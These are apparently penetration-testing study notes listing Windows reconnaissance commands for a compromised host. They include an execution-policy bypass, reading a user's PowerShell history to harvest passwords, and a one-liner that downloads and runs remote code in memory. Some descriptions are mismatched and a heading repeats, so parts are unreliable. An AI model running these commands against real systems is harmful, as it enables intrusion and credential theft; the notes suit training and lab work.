## Table of Contents

- [Environment Commands for Host & Network Recon](#Environment\Commands\for\Host\&\Network\Recon)
      - [Downgrade Powershell](#Downgrade\Powershell)
      - [Downgrade Powershell](#Downgrade\Powershell)


### Environment Commands for Host & Network Recon


```PowerShell
hostname --

[System.Environment]::OSVersion.Version -- Prints the PC's name

wmic qfe get Caption,Description,HotFixID,InstalledOn -- prints the patches and hotfixes applied to the host


ipconfig /all  -- Prints out network adapter state and cofigurations

set -- Displays a list of environment variables for the current session (ran form CMD prompt)

echo %USERDOMAIN% -- Displays the domain name to which the host belongs


echo %logonserver%  -- prints out the name ofthe Domain Controller th ehost checks in with.









```


```powershell

Get-Module	Lists available modules loaded for use.


Get-ExecutionPolicy -List	Will print the execution policy settings for each scope on a host.


Set-ExecutionPolicy Bypass -Scope Process	This will change the policy for our current process using the -Scope parameter. Doing so will revert the policy once we vacate the process or terminate it. This is ideal because we won't be making a permanent change to the victim host.


Get-Content C:\Users\<USERNAME>\AppData\Roaming\Microsoft\Windows\Powershell\PSReadline\ConsoleHost_history.txt	
With this string, we can get the specified user's PowerShell history. This can be quite helpful as the command history may contain passwords or point us towards configuration files or scripts that contain passwords.


Get-ChildItem Env: | ft Key,Value	
Return environment values such as key paths, users, computer information, etc.


powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('URL to download the file from'); <follow-on commands>"	


This is a quick and easy way to download a file from the web using PowerShell and call it from memory.


```

#### Downgrade Powershell

```powershell-session
PS C:\htb> Get-host
```

#### Downgrade Powershell

```powershell-session
PS C:\htb> Get-host
```

